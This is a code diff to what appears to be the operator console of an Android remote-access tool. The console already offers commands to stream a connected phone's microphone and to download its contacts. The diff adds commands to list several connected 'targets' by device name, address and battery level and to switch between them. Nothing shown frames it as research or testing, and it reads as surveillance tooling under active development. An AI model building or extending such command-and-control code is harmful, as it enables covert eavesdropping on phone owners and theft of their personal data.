@@ -27,7 +27,9 @@ def print_help(post_start: bool = False, post_connect: bool = False) -> None:
         print("  quit             exit")
         print("  (waiting for client...)")
         return
-    print("  disconnect       disconnect the Android client")
+    print("  clients          list connected clients and active target")
+    print("  select <id>      switch active target client")
+    print("  disconnect       disconnect the active client")
     print("  use mic          start mic audio stream")
     print("  stop mic         stop mic audio stream")
     print("  get contacts     download contacts.zip to storage dir")
@@ -83,6 +85,26 @@ async def shell_loop() -> None:
                 print("not listening")
             else:
                 await stop_tcp_server_action()
+            continue
+
+        if cmd in ("clients", "targets"):
+            clients = state.list_clients()
+            if not clients:
+                print("no clients connected")
+            else:
+                for c in clients:
+                    marker = "*" if c.get("is_active") else " "
+                    print(f" {marker} [{c['id']}] {c['device_name']} ({c['addr']}) - Battery: {c.get('battery_level', '?')}%")
+            continue
+
+        if cmd.startswith("select ") or cmd.startswith("switch "):
+            parts = cmd.split()
+            if len(parts) >= 2:
+                target_id = parts[1]
+                if state.set_active_client(target_id):
+                    print(f"switched active client to {target_id}")
+                else:
+                    print(f"client not found: {target_id}")
             continue
 
         if cmd == "disconnect":
